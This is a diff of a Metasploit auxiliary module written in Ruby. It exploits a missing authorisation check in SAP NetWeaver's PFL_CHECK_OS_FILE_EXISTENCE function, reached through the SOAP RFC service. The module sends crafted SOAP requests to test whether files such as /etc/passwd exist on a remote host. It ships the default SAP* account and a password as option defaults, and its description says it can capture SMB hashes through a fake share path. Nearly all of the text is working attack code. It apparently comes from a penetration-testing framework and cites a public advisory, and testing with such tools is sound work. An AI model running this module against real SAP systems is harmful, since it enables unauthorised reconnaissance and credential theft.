@@ -31,24 +31,32 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'PFL_CHECK_OS_FILE_EXISTENCE (file existence and SMB relay)',
+			'Name' => 'SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check',
 			'Description' => %q{
-								This module exploits the SAP NetWeaver PFL_CHECK_OS_FILE_EXISTENCE Missing Authorization Check and SMB Relay Vulnerability.
-								It can be exploited remotely using RFC or webrfc without any additional autorisation by the user.
-								Additionally it can be exploited via transaction SE37.
-								SAP Note 1591146 / DSECRG-12-009.
-								},
-			'References' => [['URL','http://erpscan.com/advisories/dsecrg-12-009-sap-netweaver-pfl_check_os_file_existence-missing-authorisation-check-and-smb-relay-vulnerability/']],
-			'Author' => ['nmonkee'],
+					This module abuses the SAP NetWeaver PFL_CHECK_OS_FILE_EXISTENCE function, on
+				the SAP SOAP RFC Service, to check for files existence on the remote file system.
+				The module can also be used to capture SMB hashes by using a fake SMB share as
+				FILEPATH.
+			},
+			'References' =>
+				[
+					[ 'OSVDB', '78537' ],
+					[ 'URL','http://erpscan.com/advisories/dsecrg-12-009-sap-netweaver-pfl_check_os_file_existence-missing-authorisation-check-and-smb-relay-vulnerability/' ]
+				],
+			'Author' =>
+				[
+					'lexey Tyurin', # Vulnerability discovery
+					'nmonkee' # Metasploit module
+				],
 			'License' => MSF_LICENSE
-			)
+		)
 
 		register_options([
-			OptString.new('CLIENT', [true, 'SAP client', nil]),
-			OptString.new('USER', [true, 'Username', nil]),
-			OptString.new('PASS', [true, 'Password', nil]),
-			OptString.new('PATH',[true,'File path (e.g. \\\\xx.xx.xx.xx\\share)',nil])
-			], self.class)
+			OptString.new('CLIENT', [true, 'SAP Client', '001']),
+			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+			OptString.new('PASSWORD', [true, 'Password', '06071992']),
+			OptString.new('FILEPATH',[true,'File Path to check for  (e.g. /etc)','/etc/passwd'])
+		], self.class)
 	end
 
 	def run_host(ip)
@@ -60,32 +68,41 @@ class Metasploit4 < Msf::Auxiliary
 		data << '<SOAP-ENV:Body>'
 		data << '<PFL_CHECK_OS_FILE_EXISTENCE xmlns="urn:sap-com:document:sap:rfc:functions">'
 		data << '<FULLY_QUALIFIED_FILENAME></FULLY_QUALIFIED_FILENAME>'
-		data << '<LONG_FILENAME>' + datastore['PATH'] + '</LONG_FILENAME>'
+		data << '<LONG_FILENAME>' + datastore['FILEPATH'] + '</LONG_FILENAME>'
 		data << '</PFL_CHECK_OS_FILE_EXISTENCE>'
 		data << '</SOAP-ENV:Body>'
 		data << '</SOAP-ENV:Envelope>'
-		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
 		begin
-			print_status("[SAP] #{ip}:#{rport} - sending request for #{datastore['PATH']}")
-			res = send_request_raw({
-				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+			vprint_status("#{rhost}:#{rport} - Sending request to check #{datastore['FILEPATH']}")
+			res = send_request_cgi({
+				'uri' => '/sap/bc/soap/rfc',
 				'method' => 'POST',
 				'data' => data,
-				'headers' =>{
-					'Content-Length' => data.size.to_s,
+				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+				'ctype' => 'text/xml; charset=UTF-8',
+				'headers' => {
 					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-					'Authorization' => 'Basic ' + user_pass,
-					'Content-Type' => 'text/xml; charset=UTF-8',}
-					}, 45)
-			if res
-				vprint_error("[SAP] #{rhost}:#{rport} - Error code: " + res.code.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error title: " + res.message.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error message: " + res.body.to_s)
+				},
+				'vars_get' => {
+					'sap-client' => datastore['CLIENT'],
+					'sap-language' => 'EN'
+				}
+			})
+			if res and res.code == 200 and res.body =~ /PFL_CHECK_OS_FILE_EXISTENCE\.Response/
+				if res.body =~ /<FILE_EXISTS>X<\/FILE_EXISTS>/
+					print_good("#{rhost}:#{rport} - File #{datastore['FILEPATH']} exists")
+				else
+					print_warning("#{rhost}:#{rport} - File #{datastore['FILEPATH']} DOESN'T exist")
+				end
+			elsif res
+				vprint_error("#{rhost}:#{rport} - Response code: " + res.code.to_s)
+				vprint_error("#{rhost}:#{rport} - Response message: " + res.message.to_s)
+				vprint_error("#{rhost}:#{rport} - Response body: " + res.body.to_s) if res.body
 			end
-			rescue ::Rex::ConnectionError
-				print_error("#{rhost}:#{rport} - Unable to connect")
-				return
-			end
+		rescue ::Rex::ConnectionError
+			vprint_error("#{rhost}:#{rport} - Unable to connect")
+			return
 		end
 	end
+end
